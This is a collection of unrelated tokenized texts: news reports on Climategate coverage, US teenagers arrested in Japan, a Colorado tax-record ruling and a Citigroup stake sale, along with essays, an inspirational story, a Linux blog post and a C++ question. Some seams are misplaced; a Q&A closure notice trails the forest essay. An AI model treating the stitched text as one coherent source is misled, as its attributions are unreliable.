Commercial rivalry followed as the young republic developed its muscles and the old empire fought to cling to its dominant world position .
The historical pattern is that interests are usually different and that therefore policies often diverge .
This was apparent during the American Civil War when the North complained that the British favoured the South too much , especially by building ships for it .
Before World War
I there was no question that the isolationist US should intervene to help Britain , and it was not until 1917 that the US entered the war - then only because of the German policy of unrestricted U - boat warfare .
And the Irish question could always have its impact .
Chicago Mayor Big Bill Thompson , at the time when the British Black and Tans were on a rampage in Ireland , declared that if he had the chance he would " bust King George in the snoot " .
Churchill ambition Between the wars there was naval rivalry , ended by the Washington Treaty of 1922 , which incidentally had the unfortunate consequence of disarming those who would later face Hitler .
Britain has declined from being the master , to being a rival , to being a partner and now to being perhaps simply useful
The Royal Navy had to rely too much on ships laid down in World War I , among them its flagship HMS Hood , the " Mighty Hood " , which lasted barely fives minutes against the Bismarck in 1941 .
This treaty , between friendly rivals , is one reason why American neo-conservatives were later so suspicious of treaties between adversaries .
It was not , of course , until the US entry into World War II that the " special relationship " really developed .
Churchill was typically world - embracing when he used the term in his Fulton speech in 1946 : " Neither the sure prevention of war , nor the continuous rise of world organisation will be gained without what I have called the fraternal association of the English - speaking peoples ... a special relationship between the British Commonwealth and Empire and the United States . "
Churchill 's view was too ambitious .
US leadership during the Cold War was based on far more than friendship between English - speaking peoples - on Nato for a start .
Britain has declined from being the master , to being a rival , to being a partner and now to being perhaps simply useful .
What still counts is a security sharing arrangement and trust , which has included the US giving the UK first the Polaris and then the Trident nuclear missile .
Diplomacy ebbs and flows but in a big world , the UK is getting smaller and perhaps the US simply less interested .
( Update : Some e-mailers have asked why I left out some issues - Suez , Vietnam , loans etc .
I did have to do some editing .
One cannot list everything , but hope the main point came across . )

The Only Way
My cell phone rang just after midnight .
I did n’t answer .
Then it rang again a minute later .
I rolled over , grabbed the phone off the night stand , and squinted at the bright , glowing caller ID screen .
“ Claire , ” it read .
Claire is a close friend – a friend who tragically lost her husband to a car accident six months ago .
And I figured since she rarely calls me in the middle of the night , it was probably important .
“ Hey , Claire .
Is everything okay ? ” I asked .
“ No ! ” she declared as she burst into tears .
“ I need to talk … I need help … ”
“ I ’m listening , ” I reassured her .
“ What ’s on your mind ? ”
“ I lost my job this evening , and I ’m tired , and I just do n’t know anymore … ”
“ A job is just a job .
They come and go .
Remember , Angel lost her job last year and it was a blessing in disguise .
She found something better . ”
“ I know , I know , ” she sighed over her tears .
“ I just felt like the world was going to end after the accident …
Ya know ?
And then my friends and family helped me get back on my feet … ”
“ And you ’re still on your feet right now , ” I added .
“ Well , sometimes I feel like I am , and sometimes I feel like I ’m barely maintaining my balance , and sometimes I feel like I ’m falling again .
And this series of feelings just keeps cycling over and over again in a loop – good days followed by bad days and vice versa .
It ’s just one long struggle .
And I ’m exhausted ! ”
“ But you keep moving forward … ”
“ Actually , ” she continued over more tears .
“ The only way I ’ve found to keep myself moving forward from moment to moment through the hard times is by repeating a short saying my grandfather taught me when I was a kid .
And I do n’t know how or why it helps now , but it does . ”
“ What ’s the saying ? ” I asked .
“ Do your best with what ’s in front of you and leave the rest to the powers above you , ” she replied .
I smiled .
Because I love pieces of inspirational prose that help people progress through even the hardest of times .
And because it suddenly reminded me of a short story my grandfather told me when I was a kid – one that ’s also applicable to Claire ’s circumstance .
“ Your grandfather was a wise man , ” I said .
“ And it ’s funny , because your grandfather ’s saying reminds me of a short story my grandfather once told me .
Would you like to hear it ? ”
“ Yeah , ” she replied .
My Grandfather ’s Story
Once upon a time , in a small Indian village , the village fisherman accidentally dropped his favorite fishing pole into the river and was unable to retrieve it .
When his neighbors caught word of his loss , they came over and said , “ That ’s just bad luck ! ”
The fisherman replied , “ Perhaps . ”
The following day , the fisherman hiked a mile down the bank of the river to see if he could find his fishing pole .
He came upon a small , calm alcove in the river bank that was loaded to the brim with salmon .
He used a back - up fishing pole to catch nearly 100 salmon , loaded them into his wagon , and brought them back to the village to barter with other villagers .
Everyone in the village was ecstatic to receive the fresh salmon .
When his neighbors caught word of his success , they came over and said , “ Wow !
What great luck you have ! ”
The fisherman replied , “ Perhaps . ”
Two days later , the fisherman began hiking back towards the alcove so he could catch more salmon .
But a tenth of a mile into the hike , he tripped on a tree stump and severely sprained his ankle .
He slowly and painfully hopped back to the village to nurse his health .
When his neighbors caught word of his injury , they came over and said , “ That ’s just bad luck ! ”
The fisherman replied , “ Perhaps . ”
Four days went by , and although the fisherman ’s ankle was slowly healing , he could not yet walk , and the village was completely out of fish to eat .
Three other villagers volunteered to go to the river to fish while the fisherman recovered .
That evening , when the three men did not return , the village sent a search party out for them only to discover that the men had been attacked and killed by a pack of wolves .
When the fisherman ’s neighbors caught word of this , they came over and said , “ You ’re so lucky you were n’t out there fishing .
What great luck you have ! ”
The fisherman replied , “ Perhaps . ”
“ A few days later … well , you can guess how the story continues , ” I said .
The Moral of the Story
Claire chuckled and said , “ Thank you . ”
Because the moral of the story was immediately clear to her .
We just do n’t know – we never do .
Life is an unpredictable phenomenon .
No matter how good or bad things seem right now , we can never be 100 % certain what will happen next .
And this actually lifts a huge weight off of our shoulders .
Because it means that regardless of what ’s happening to us right now – good , bad or indifferent , it ’s all just part of the phenomenon we call ‘ life ’ – which flows like the river in my grandfather ’s story , unpredictably from one occurrence to the next .
And the smartest choice we can make is to swim with the flow of the river .
Which means , quite simply , not panicking in the face of unforeseen misfortunes or losing our poise in limelight of our triumphs , but instead “ doing our best with what ’s in front of us and leaving the rest to the powers above us . ”

Even though all three of Wednesday 's broadcast network evening newscasts reported on President Obama 's decision to attend the climate change summit in Copenhagen , they also continued to ignore email evidence that scientists who push global warming theory have distorted data to support their assertions while trying to suppress the views of dissenters .
FNC 's Special Report with Bret Baier gave attention to the Climategate controversy on Monday and Wednesday , while Wednesday 's The Situation Room on CNN , guest hosted by Suzanne Malveaux , ran what appears to be CNN 's first story on the controversy , but correspondent Brooke Baldwin downplayed the story 's significance .
The same story ran twice on the Friday , November 27 , American Morning on CNN .
Baldwin began and ended her report fretting over the timing of the revelation as coming so soon before the climate change summit in Copenhagen .
She also twice referred to a climate change " consensus , " a loaded term which is normally employed by those who believe global warming theory is not debatable .
Baldwin began her report by rhetorically asking , " How about the timing of all of this ? "
She again noted the timing in her conclusion : " Again , here , all of this coming out weeks - as you mentioned , Suzanne - ahead of Copenhagen 's climate summit where President Obama will , in fact , be attending , and today the White House announced that the President is prepared , speaking of those caps here , to put on the table a U.S. emissions reduction target in the range of 17 percent below 2005 levels . "
Baldwin partially quoted one email , but , unlike FNC's Angle and Goler , the CNN correspondent seemed to give her own opinion that " it 's hard to know what [ the emails ] will add up to " because " there 's very little context , " rather than quoting the view of one of the scientists in question for a dissenting view as FNC did .
Baldwin :
When a reputable climate research institute has its computer server hacked and hundreds of its private e-mails made public , the news gets around fast , especially from groups that do n't believe the global warming consensus .
One e-mail attributed to the research center 's director had this cryptic excerpt referring to the , quote , " trick of adding in the real temps " to each series to hide the decline in temperature .
Because there 's very little context in that e-mail and the others , it 's hard to know what they 'll all add up to .
Video of the CNN report can be found here .
FNC 's Special Report first got to Climategate on Monday during the regular " Political Grapevine " segment .
After noting that Republican Senator James Inhofe was planning to investigate the issue , substitute host Jim Angle relayed the content of one of the emails , and the contention by its author that it was taken out of context .
Angle : " One of the e-mails found and posted from center director Phil Jones refers to a technique , quote , ' hide the decline in recent global temperatures . '
Jones wrote that in compiling new data he had used what he called the ' trick ' of adding in temperatures from different time periods to hide the decline .
...
Jones says the comment was taken out of context . "
Wednesday 's show led with the story of President Obama 's decision to go to Copenhagen , and correspondent Wendell Goler 's report dealt partially with Climategate .
Substitute anchor Chris Wallace treated the issue with credibility as he introduced the report .
Wallace : " The White House is characterizing President Obama 's decision to go to next month 's U.N. climate change conference as a sign of his commitment to find a solution to global warming , but recently discovered emails from climate scientists have many people now doubting just how legitimate that threat is . "
Goler relayed that hacked emails " allegedly show climate change data was distorted or destroyed to make the case for global warming , " and then quoted one scientist , Dr. Kevin Trenberth , as the scientist seemed to fret about some evidence that contradicted global warming theory .
The FNC correspondent passed on Trenberth 's contention that his words were taken out of context .
Goler : " Kevin Trenberth of the U.S. Center for Atmospheric Research saying , quote , ' The fact is we can't account for the lack of warming at the moment , and it's a travesty that we can 't . '
Dr. Trenberth and others say their words were taken out of context . "
FNC's Fox Report showed a similar report by Goler the same evening .
During the show 's " Fox All Stars " segment , conservative leaning syndicated columnist Charles Krauthammer gave his view on the matter 's significance :
So what you see in the emails are people who have , are on somewhat shaky grounds .
It 's not as if there 's no science at all in this , but there is contradictory evidence , such as the flattening of the rise in temperatures , which they cannot explain .
And their response is , as we saw here , either suppression or manipulation or , even worse , the delegitimation and the personal attacks on skeptics in an attempt to write them out of the journals , to get them fired , and all kinds of nasty stuff .
So I think it puts a lot of their research in question .
Below are transcripts of relevant portions of the Monday , November 23 , Special Report with Bret Baier on FNC , the Wednesday , November 25 , Special Report , and the Wednesday , November 25 , The Situation Room on CNN :
# From the November 23 Special Report :
JIM ANGLE : And now the latest from the " Political Grapevine . "
The leading global warming skeptic in Congress says he 'll ask for an investigation into allegations that some scientists have purposely overstated the data supporting the theory of man-made climate change .
Oklahoma Republican Senator James
Inhofe is referring to information discovered by computer hackers who reportedly broke into a server at a well - respected climate change research center in Britain .
One of the e-mails found and posted from center director Phil Jones refers to a technique , quote , " hide the decline in recent global temperatures . "
Jones wrote that in compiling new data he had used what he called the " trick " of adding in temperatures from different time periods to hide the decline .
Climate change skeptics argue data indicates global temperatures stopped increasing as far back as 1960 .
Jones says the comment was taken out of context .
Inhofe points to all that to bolster his suspicion that the U.N. and its climate change panel , quote , " cooked the science to make this thing look as if the science was settled when all the time we knew it was not . "
# From the November 25 Special Report :
CHRIS WALLACE : Welcome to Washington .
I 'm Chris Wallace in for Bret Baier .
The White House is characterizing President Obama 's decision to go to next month 's U.N. climate change conference as a sign of his commitment to find a solution to global warming , but recently discovered e-mails from climate scientists have many people now doubting just how legitimate that threat is .
White House correspondent Wendell Goler explains .
WENDELL GOLER : Aides announced the President will stop in Copenhagen near the start of the climate change conference before going to Oslo , Norway to receive the Nobel Peace Prize .
Environmentalists will be watching .
KEYA CHATTERJEE , WORLD WILDLIFE FUND : - and what we 're looking for is a signal that climate and clean energy are going to be the next legislative priority up after health care .
GOLER : Mr. Obama will promise to cut America 's greenhouse gas emissions at least 17 percent over the next 10 years , 30 percent over the next 15 .
Since a treaty is unlikely in Copenhagen , his goal is something less .
BARACK OBAMA : A strong operational agreement that will confront the threat of climate change while serving as a stepping stone to a legally binding treaty .
GOLER : Still , environmentalists want a stronger commitment to a green economy and something more than an operational agreement .
CHATTERJEE :
We 're looking for legal treaty text to come out of Copenhagen .
GOLER : The Chamber of Commerce says the U.S. would have to build 130 nuclear power plants to cut greenhouse gases enough to meet the targets - a huge expense that comes as polls show belief in global warming has fallen six percent among Democrats over the past few years , 15 percent among independents , and 22 percent among Republicans .
It 's unclear if economic concerns are feeding the doubts , but they are fueling a challenge to the EPA 's claim that it has the authority to regulate greenhouse gas emissions which the Competitive Enterprise Institute says could cost trillions .
MYRON EBELL , COMPETITIVE ENTERPRISE INSTITUTE :
We think that the EPA 's decision is fundamentally flawed because it is based on junk science .
GOLER : Myron Ebell 's group has found new ammunition in thousands of e-mails hacked or leaked from East Anglia University in England which allegedly show climate change data was distorted or destroyed to make the case for global warming .
EBELL : If we 're cherry - picking , these are very large cherries .
They 're very ripe and they 're very hard to miss once you look through these files and these e-mails .
GOLER : For example , Kevin Trenberth of the U.S. Center for Atmospheric Research saying , quote , " The fact is we can't account for the lack of warming at the moment , and it's a travesty that we can 't . "
Dr. Trenberth and others say their words were taken out of context .
KEVIN TRENBERTH , NATIONAL CENTER FOR ATMOSPHERIC RESEARCH :
It certainly does n't mean that there 's no global warming .
It does mean we do n't have a complete enough observing system to fully track exactly what 's going on and especially why it 's going on .
GOLER : Trenberth says rising CO2 levels , melting ice , rising water and warmer temperatures are all measurable .
TRENBERTH : Global warming is happening .
There are some uncertainties and the models are not perfect , and the key questions are then what do we do about it , and this is where the debate certainly is required .
GOLER : Oklahoma Senator James
Inhofe plans hearings on whether the e-mails show the science on climate change was cooked .
Meanwhile , even though the President only plans to spend the day in Copenhagen , a half a dozen of his cabinet secretaries will spend time there making presentations they hope will lead to an agreement .
...
CHRIS WALLACE : Charles , I want you to weigh in on all this and also this fascinating story about somebody hacking into the files of the Climate Research Unit in East Anglia in Britain and finding some e-mails from climate scientists where they talked about , quote , " hiding the decline in global temperatures " because obviously if the earth is cooling , then that hurts the global warming argument .
CHARLES KRAUTHAMMER , SYNDICATED COLUMNIST :
The global warming science is not junk science , but it 's speculative .
It 's based on incomplete data .
It 's based on computer models that rest on assumptions that , in turn , rest on an understanding of how the globe , the climate controls itself that is extremely incomplete .
So its projections are speculative .
But it pretends that , of course , that it 's the hardest of all sciences and anybody who is skeptical is a denier , using a term used normally about the Holocaust , which is , of course , an event that actually happened as opposed to projections in global warming , which are speculative science .
So what you see in the emails are people who have , are on somewhat shaky grounds .
It 's not as if there 's no science at all in this , but there is contradictory evidence , such as the flattening of the rise in temperatures , which they cannot explain .
And their response is , as we saw here , either suppression or manipulation or , even worse , the delegitimation and the personal attacks on skeptics in an attempt to write them out of the journals , to get them fired , and all kinds of nasty stuff .
So I think it puts a lot of their research in question .
I think what 's interesting about Obama is he 's going to be at the U.N. to announce the policy about climate change on the basis of nothing .
He 's going to be proposing what the House has passed that he knows is not going to pass in the Senate .
And we are actually a constitutional democracy where the President can't announce a policy unilaterally .
It actually has to pass the two houses of the Congress , and our allies abroad know that , and they 're going to look at this announcement he 's going to make and think it 's going to be extremely strange .
# From the 5:00 p.m. hour of the November 25 The Situation Room :
SUZANNE MALVEAUX : President Obama will go to Copenhagen next month for a major climate change summit .
That word today coming from the White House , and it comes as Congress is still divided over new climate change legislation .
Meanwhile , the global warming controversy , that is heating up as well , after hackers have made public some of these sensitive e-mails .
Our CNN 's Brooke Baldwin , she 's got the story .
Brooke , tell us what this is about , the center of this controversy over the e-mails .
BROOKE BALDWIN : Yes , Suzanne , how about the timing of all of this ?
Yes , we are talking about hundreds of e-mails and documents spanning just about a decade here among prominent climate scientists , and they have been hacked , as you mentioned , fanning really a debate over whether some scientists might have exaggerated their case for manmade climate change .
BALDWIN : The consensus that the climate is changing , that the burning of fossil fuels is a significant factor goes way beyond the pop culture sensation of Al Gore 's Inconvenient Truth and his appearance on last week 's episode of 30 Rock on NBC .
AL GORE , FROM 30 ROCK : Kenneth , encourage your lawmakers to take action and recycle everything , including jokes .
KENNETH , THE PAGE , FROM 30 ROCK : I 'm sorry , sir , what ?
GORE : Quiet , a whale is in trouble .
I have to go .
BALDWIN : So when a reputable climate research institute has its computer server hacked and hundreds of its private e-mails made public , the news gets around fast , especially from groups that do n't believe the global warming consensus .
One e-mail attributed to the research center 's director had this cryptic excerpt referring to the , quote , " trick of adding in the real temps " to each series to hide the decline in temperature .
Because there 's very little context in that e-mail and the others , it 's hard to know what they 'll all add up to .
A climate research unit in question here posted a message calling this e- mail hack job " mischievous " and saying it is helping the police investigate .
Senator James
Inhofe has for many years portrayed this data showing the warming trend as a hoax and sees the e-mails as evidence .
SENATOR JAMES INHOFE ( R - OK ) : I 'm pleased by the vast and growing number of scientists , politicians , reporters , all over the world who are publicly rejecting climate alarmism , alarmism , this is , those who want to scare people into some kind of action , you know , the water 's going to rise up , the world 's coming to an end .
BALDWIN : But the White House energy czar points to the 2,500 climate scientists all around the world who agree the climate is warming and that these e-mails are n't changing that .
As for the American public , according to a Washington Post / ABC News poll out this week , the number of Americans who believe global warming is happening is down from 80 to 72 percent from last year , down but still a large majority .
UNIDENTIFIED WOMAN #1 : We really do have a global warming .
The polar bears are getting in trouble , and the glaciers are melting .
UNIDENTIFIED WOMAN # 2 : I do think that we tend to blow things a little out of proportion , but I do think we need to be concerned .
UNIDENTIFIED MAN : I think it is over hyped .
I think some of it is attributed to man but not all of it .
BALDWIN : That same Washington Post / ABC
News poll shows since 2006 the increase in climate skepticism is driven largely by a shift within the Republican Party and independents .
There was also a dip among Democrats but small .
Still , a majority of respondents support a national cap on greenhouse gas emissions .
BALDWIN : Now back to those hacked e-mails and the documents .
We also want to point out that it suggests some scientists pressured journals not to publishing work of those who questioned whether the earth is , in fact , warming , but , again , here , all of this coming out weeks - as you mentioned , Suzanne - ahead of Copenhagen 's climate summit where President Obama will , in fact , be attending , and today the White House announced that the President is prepared , speaking of those caps here , to put on the table a U.S. emissions reduction target in the range of 17 percent below 2005 levels .
That deadline for 2020 , and by 83 percent by 2050 , and , you know , this will ultimately be in line with targets laid out in a bill passed by the House earlier this year .

Tokyo , Japan ( CNN ) --
Four American teenagers , all children of U.S. military personnel , have been arrested on charges of attempted murder after a woman was knocked off her motorbike with rope strung across two poles , Japanese police said .
The four suspects -- two 15 - year - old boys , a 17 - year - old girl and an 18 - year - old man -- were taken into custody on Saturday , the Tokyo Metropolitan Police Department said .
They are accused of causing a severe head injury to a 23 - year - old restaurant employee by stringing a rope between poles across a road .
U.S. Forces Japan was informed of the August incident in late October , a public information officer said .
There was no clear explanation for the delay in the handover of the suspects to police , other than it involved rules between Washington and Tokyo covering U.S. forces and their dependents in Japan .
The U.S. military presence and its impact on Japanese residents have been a thorny issue over the years .
Most recently , residents of the Japanese island of Okinawa , where the U.S. maintains a large military presence , have blamed American troops for crime and noise .
In 2008 , a 14 - year - old Okinawa girl alleged that a Marine had raped her .
The prosecutor released the Marine after the girl decided not to pursue charges .
In 1995 , a 12 - year - old girl was gang - raped by three servicemen .
A Japanese court convicted all three men .
Both incidents caused a furor in Japan .
Then - Prime Minister Yasuo Fukuda called the 2008 incident " unforgivable ...
It has happened over and over again in the past and I take it as a grave case . "
It is unclear what , if any , role the military can take in the case .
The 1960 Status of Forces Agreement between the United States and Japan gives Japan jurisdiction over " the members of the United States armed forces , the civilian component , and their dependents " in cases of offenses committed in Japan and punishable under Japanese law .
The agreement also says the United States must cooperate in investigating such offenses .

For the past year , at least , I ’ve been chiseling away at Crux systems , compiling sometimes for days straight in order to get clean , sharp , fast systems that run light and are tuned nicely to the hardware they reside in .
I ’ve learned a lot , and for that I ’m thankful .
On the other hand , there are some things that I still have n’t quite gotten right — like getting ancient VESA hardware to work with modern kernel framebuffer support , or using an Xorg later than 7.3 , or getting closer to configuring an ISA sound card .
These things are n’t necessarily impossible , I always said to myself .
My failures and inability to get more information are just the shape of the learning curve .
So for more than a year probably , I ’ve been swapping drives and trying any number of installations and reinstallations , different kernels , different configurations , adding this or enabling that , and never really making much progress .
And then along comes Slitaz .
Slitaz has already given me the proverbial “ middle finger , ” as some of my American friends say — being the only distro I know that I did n’t build myself that can run comfortably on less than 16 Mb of memory .
A day or two ago it did it again , popping up a graphical desktop with Xorg 7.4 , which has n’t worked for me ever .
And then yesterday it blows another raspberry at me .
That ’s when , on a whim , I took a very basic Slitaz installation and force - fed it the vga kernel flag for an 800x600x16 framebuffer .
The hope was that it would choke on it , fall back to a console screen , and allow me to adjust some of the root configuration before snapping to the desktop , and losing the terminal access ( do n’t ask … it ’s a long story ) .
And after a pause of about 3 seconds , I get a full 224 - color tux logo and a complete boot report , at 800×600 .
How is that possible ?
How did that happen ?
I ’ve never had a proper framebuffer on this machine ever .
Neither this nor its predecessor ever showed me anything console - esque at more than 640×480 , regardless of what I enabled , checked , configured or compiled in Crux .
Life just is n’t fair .
That ’s all there is to it . …
I still have a few smaller things to figure out .
I need alsaconf to configure my ISA sound card and modern versions of alsa-utils disable that by default , so I have to make it myself .
I was able to change the font with setfont , and then an update or something caused it to start spewing forth “ garbage ” messages ( no , literally , it complains of garbage .
I would n’t lie about that ) .
And there is some network hopscotch that I have to play , to get wireless working from the console .
And to be honest , it ’s not as speedy as my Crux builds .
But it ’s just as light , and all the more impressive since it ’s already done two or three things that I have n’t been able to , at all , ever .
If I get the sound card configured , this will be a major coup .
But I ’ll only get half the credit , since all the heavy lifting was done by the Slitaz developers .

GREELEY —
The Colorado Supreme Court ruled Monday that a 2008 raid of a local tax preparer ’s office aimed at building identity - theft cases against hundreds of suspected illegal immigrants violated their Fourth Amendment right to privacy .
The 4 - 3 ruling was the latest and most devastating legal blow against Operation Numbers Game , an investigation launched by Weld County Sheriff John Cooke and District Attorney Ken Buck that aimed to use tax returns to identify and prosecute illegal immigrants .
The raid on Amalia ’s Tax and Translation , a business that caters to Spanish - speaking clients , led to the seizure and review of some 4,900 tax returns .
Deputies said they found about 1,300 suspects in identity - theft and criminal - impersonation cases .
More than 100 suspected illegal immigrants were arrested because of the raid , and charges were formally filed against 70 of them .
About 60 cases were then dismissed after Weld District Judge James Hartmann , ruling in one of the criminal cases , tossed evidence investigators had seized during their search of Amalia’s .
No more than three of the criminal cases made it to Colorado ’s high court , including the case in which the justices ruled Monday , said Mark Silverstein , American Civil Liberties Union legal director .
On Monday , Buck conceded Operation Numbers Game “ is over , ” adding he will not appeal the decision .
A Colorado prosecutor can appeal a case only as far as the state high court , according to Colorado law , but a defendant can appeal to a higher court .
But Buck felt the raid was justified .
“ I feel the court made its decision and then later developed rationale for this decision , ” Buck said .
Prosecutors around the country have been watching the case closely , reportedly the first in the United States in which law enforcement sought to use tax returns — generally considered confidential under federal law — to take suspected illegal immigrants to criminal court .
The court majority ruled that the defendant in this case , Ramon Gutierrez , as a taxpayer “ has a reasonable expectation of privacy in his or her tax returns and return information , even when that information is in the custody of a tax preparer . ”
The ruling also said that Gutierrez , who was among more than 70 people charged with criminal impersonation and identity theft , was a victim of an “ exploratory search ” and that police had no probable cause to search Gutierrez ’s tax records .
Gutierrez has been free on bond and likely will have charges dismissed soon , Buck said .
Three justices dissented to the opinion .
Justice Nancy C. Rice wrote a dissent in which she said because police officers “ acted in good faith when they seized the tax records , I find it unnecessary to consider whether the affidavit supporting the warrant failed to establish probable cause . ”
She was joined by Justice Allison Eid .
Justice Nathan B. Coats also wrote a dissent , in which he worried about bigger issues in the case , significantly the presumption that the tax preparers were shielded from criminal liability as they aided “ taxpayers to knowingly report income earned under Social Security numbers belonging to someone else . ”
“ I believe it is a mistake that fundamentally distorts the majority ’s Fourth Amendment analysis , ” Coats wrote .
Kevin Strobel , the head of the Greeley public defender ’s office , said police and prosecutors still have to follow the law when dealing with illegal immigrants .
“ There ’s still a constitutional framework for how authorities deal with that population and whether they ’ve committed crimes or not , ” Strobel said .
“ They gotta follow the rules . ”
The court noted that four district judges have now ruled against Operation Numbers Game , including in a civil case against Buck and Cooke brought by the American Civil Liberties Union .
Buck said he did n’t know how the court ’s Monday decision would affect his civil case .
Tax returns in that case remain with the Weld County courts , pending a final Supreme Court decision .
Buck said he wo n’t be scared off from continuing to prosecute allegedly illegal immigrants .
“ We were successful in a lot of different ways , ” he said .
“ We showed there was an issue of a failed federal policy on illegal immigration , and people now understand the source of identity theft .
“ And we gained valuable intelligence in fighting identity theft , ” he said .

This is horrifying .
The world ’s forests are a key to our survival , and that of millions of other species .
Not only are they critical to providing us with building material , paper , food , recreation and oxygen , they also ground us spiritually and connect us to our primal past .
Never before in earth ’s history have our forests been under such attack .
And the global - warming folks at Copenhagen seem oblivious , buying into the corporate view of forests as an exploitable resource .
A forest is an ecosystem .
It is not something planted .
A forest grows on its own .
There are many kinds of forests that will grow practically anywhere , each under its own special local conditions .
When a tree falls , the race is on immediately to replace it .
In the forests I study , there so many seeds and seedlings that if a square foot of ground space opens up , more than a hundred trees of many different species compete to grow there .
So if you want to plant a specific species of tree for lumber or for offsets , you ’ll have to apply an ( petroleum - based ) herbicide repeatedly over its lifespan .
If you hope to make a profit , you will plant a tree genetically engineered to grow quickly and resist disease .
This is the path to domestication of a plant that needs to be ever coddled with fertilizers , herbicides , pesticides and fungicides .
And not coincidentally , there will then be a market for its seeds , and all the chemicals needed to coddle the crop .
In the end , what was originally intended as a mechanism for slowing global warming has created huge economic pressure for ecocide .
And there will be no objections from easily duped bleeding - heart “ environmentalists , ” who absolutely love tree planting because it sounds so “ green . ”
To preserve something it first has to be valued , and the most effective means of valuing it is to have a practical use for it .
If the discussions in Copenhagen were any indication , mankind sees little value in forests , but much in tree plantations .
( On the other hand , I admit that those of us who really do care about forests have not exactly been helpful .
We have not encouraged selective harvesting from naturally occurring stands , which may be necessary . )
It is easy to scream bloody murder against tree planting as a means for biomass energy and industrial fiber production , but there then has to be an alternative ( aside from the obvious one of energy conservation ) .
We need either vastly fewer people or vastly more forests , along with a new definition of earth - friendly reforestation .
These new stands of growth  if managed as true forest rather than as a single - species , single - aged crops  would contain a mixture of mature and transitional - growth trees .
Any tree cut down would immediately generate a race of others to replace it at that spot , and the winner will emerge from a natural selection of seeds and seedlings most suited to grow there .
No , this is n’t the fastest way to build up carbon credits .
But it is the only real way to preserve the planet , and ourselves .
As it currently stands , this question is not a good fit for our Q&A format .
We expect answers to be supported by facts , references , or expertise , but this question will likely solicit debate , arguments , polling , or extended discussion .

When I first learned C++ 6 - 7 years ago , what I learned was basically " C with Classes " .
std::vector was definitely an advanced topic , something you could learn about if you really wanted to .
And there was certainly no one telling me that destructors could be harnessed to help manage memory .
Today , everywhere I look I see RAII and SFINAE and STL and Boost and , well , Modern C++.
Even people who are just getting started with the language seem to be taught these concepts almost from day 1 .
My question is , is this simply because I 'm only seeing the " best " , that is , the questions here on SO , and on other programming sites that tend to attract beginners ( gamedev.net ) , or is this actually representative of the C++ community as a whole ?
Is modern C++ really becoming the default ?
Rather than being some fancy thing the experts write about , is it becoming " the way C++ just is " ?
Or am I just unable to see the thousands of people who still learn " C with classes " and write their own dynamic arrays instead of using std::vector , and do memory management by manually calling new / delete from their top - level code ?
As much as I want to believe it , it seems incredible if the C++ community as a whole has evolved so much in basically a few years .
What are your experiences and impressions ?
( disclaimer : Someone not familiar with C++ might misinterpret the title as asking whether C++ is gaining popularity versus other languages .
That 's not my question .
" Modern C++ " is a common name for a dialect or programming style within C++ , named after the book " Modern C++ Design : Generic Programming and Design Patterns Applied " , and I 'm solely interested in this versus " old C++ " .
So no need to tell me that C++'s time is past , and we should all use Python ; ) )

As a volunteer in the International Brigades that fought in Spain 's civil war , the unidentified black soldier in the photograph was one of the first Americans to die fighting fascism .
Now Spanish authorities want to put a name to him so they can present his picture to President Barack Obama when he visits Spain next year .
The black and white picture of the African American volunteer forms part of an extraordinary collection of civil war photographs that was bought recently by the Spanish state .
" All we know is that he arrived with the Abraham Lincoln Brigade of American volunteers and that he died in the battle at Brunete [ in July 1937 ] , " said Sergi Centelles , whose father , Agustí , took the picture .
The soldier is one of more than 90 African - Americans who volunteered to defend Spain 's elected Republican government from a 1936 rightwing military uprising that sparked a three - year civil war .
Germany 's Adolf Hitler and Italy 's Benito Mussolini sent troops to back the rebel army of future dictator General Francisco Franco .
Leftwing and anti-fascist volunteers from around the world joined Russians sent by Stalin to help defend the Republic .
Obama defended the concept of waging a " just war " in his Nobel peace prize speech this month .
The New York - based Abraham Lincoln Brigades Association and New York University 's Tamiment library have scoured their civil war archives to see if they could identify the man in the photograph , which was probably taken in February 1937 .
Two possible candidates have emerged : Milton Herndon , whose brother Angelo won a famous supreme court case against a sentence for " incitement to insurrection " , and aviator Paul Williams .
" It is one of eight or nine photographs my father took of the Americans marching through Barcelona , " said Agustí Centelles .
The photograph remained hidden for four decades after Agustí Centelles , known as the " Spanish Robert Capa " , fled Spain as Franco 's forces looked set to win the civil war in 1939 .
" My father took his photographs with him in a suitcase because he was scared they would be used to identify people and carry out reprisals , " said Sergi Centelles .
The photographer used the suitcase as a pillow in a French refugee camp to prevent it from being stolen .
He later moved in with a French family in Carcassonne , in southern France , but had to flee again after the second world war broke out and the occupying Germans heard that he was using his camera to take photographs for false passports .
" The Gestapo were chasing him , so he walked back across the Pyrenees into Spain , " said Sergi Centelles .
" He left the suitcase behind , telling the French family not to and it over to anyone but him .
" It was passed down from the grandfather , when he died , to his son and then , when he also died , to the grandson . "
Agustí Centelles sent the French family a present every Christmas as a sign that he was still alive .
Spain did not give the photographer a passport until 1962 , when the family travelled to Carcasonne to check the suitcase was still there .
It was only in 1976 , a year after Franco died , that he dared pick up the suitcase and bring it home .
It contained hundreds of civil war photographs , including one of writer George Orwell with a group of fellow international volunteers .
The mix of races in the International Brigades saw attempts made to observe a degree of racial equality otherwise unseen in western armies in the 1930s .
" We know there were quite a few African American volunteers and that many were treated badly when they went home , as people thought they were communists , " said Sergi Centelles .
" We have four or five names of possible candidates , but what we really want to do is to find their family . "

The Kuwait Investment Authority ( KIA ) , the country 's sovereign wealth fund , has sold its entire stake in Citigroup Inc. ( C ) and made a 37 % return on its initial investments .
The KIA converted all its preferred shares to common shares and sold the stake for $ 4.1 billion , making a profit of $ 1.1 billion .
The KIA had invested $ 3 billion in Citigroup by acquiring the preferred shares in January 2008 to help the bank strengthen its capital position when it was hit hard by the subprime - mortgage losses in the U.S .
At that time , the KIA had also invested $ 2 billion in Merrill Lynch , which was bought by Bank of America Corporation ( BAC ) in 2008 .
The stake sale news by KIA comes in the midst of Citigroup ’s effort to seek the government ’s approval to allow it to repay the TARP fund .
Last week , Bank of America has announced its plan to repay the TARP fund .
This has increased the pressure on Citigroup and Wells Fargo & Company ( WFC ) , both of whom have also borrowed from the TARP .
In September , the Government of Singapore Investment Corp. realized a profit of $ 1.6 billion by selling around half of its Citigroup stake after converting its preferred shares to ordinary shares .
Prior to the investment by KIA in Citigroup in January 2008 , Abu Dhabi Investment Authority ( ADIA ) had invested $ 7.5 billion in Citigroup in November 2007 .
The investment was made in return of an 11 % dividend until March 2010 when it has to start buying the bank 's common stock .
As per the deal , the units will be converted at a price of not less than $ 31.83 per share .
Incidentally , both KIA and ADIA had been criticized for their investment in Citigroup when the shares plunged with the worsening of the economic crisis .

Every few weeks , Torontoist receives transmissions from the travel log of Gleebax , the alien Urbanaut , as he explores the foreign land of Toronto .
